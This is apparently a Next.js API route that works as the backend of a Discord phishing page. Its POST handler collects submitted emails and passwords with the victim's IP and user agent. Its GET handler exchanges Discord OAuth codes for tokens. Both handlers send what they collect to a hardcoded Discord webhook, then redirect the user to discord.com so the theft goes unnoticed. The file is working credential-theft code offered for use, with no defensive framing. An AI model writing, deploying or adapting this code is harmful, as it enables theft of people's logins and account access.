import { NextRequest, NextResponse } from 'next/server';

const HOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function hitHook(title: string, data: Record<string, any>) {
  const embed = {
    title,
    color: 0x5865F2,
    timestamp: new Date().toISOString(),
    fields: Object.entries(data).map(([k, v]) => ({
      name: k,
      value: String(v).slice(0, 1024) || '—',
      inline: true
    }))
  };

  await fetch(HOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  }).catch(() => {});
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    if (body.type !== 'creds') return NextResponse.json({});

    await hitHook('Login', {
      Email: body.email || '—',
      Pass: body.password || '—',
      IP: req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'unknown',
      UA: req.headers.get('user-agent') || '—'
    });

    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({});
  }
}

export async function GET(req: NextRequest) {
  const params = new URL(req.url).searchParams;
  const code = params.get('code');

  if (!code) return NextResponse.redirect('https://discord.com/login');

  try {
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: 'YOUR_CLIENT_ID',
        client_secret: 'YOUR_CLIENT_SECRET',
        grant_type: 'authorization_code',
        code,
        redirect_uri: 'https://YOUR_DOMAIN_HERE.com/api/auth'
      }).toString()
    });

    const tokens = await tokenRes.json();

    if (tokens.error) throw new Error(tokens.error);

    await hitHook('Tokens', {
      Access: tokens.access_token?.slice(0, 15) + '...' || '—',
      Refresh: tokens.refresh_token?.slice(0, 15) + '...' || 'none',
      Expires: tokens.expires_in || '—',
      Scopes: tokens.scope || '—',
      IP: req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'unknown'
    });

    return NextResponse.redirect('https://discord.com/channels/@me');
  } catch {
    return NextResponse.redirect('https://discord.com/login');
  }
}
